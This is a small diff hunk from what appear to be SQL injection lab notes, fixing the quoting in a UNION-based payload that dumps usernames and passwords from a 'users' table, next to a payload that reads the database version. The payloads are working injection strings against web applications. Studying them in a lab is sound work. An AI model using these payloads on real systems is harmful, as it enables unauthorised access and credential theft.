@@ -198,7 +198,7 @@ GIVEN : The database contains a different table called users, with columns calle
        'UNION SELECT NULL,version() --+
 
       -FIND THE USER&PASSWORD 
-      'UNION SELECT NULL,username||~||password from users --+
+      'UNION SELECT NULL,username||'~'||password from users --+
 
 
 
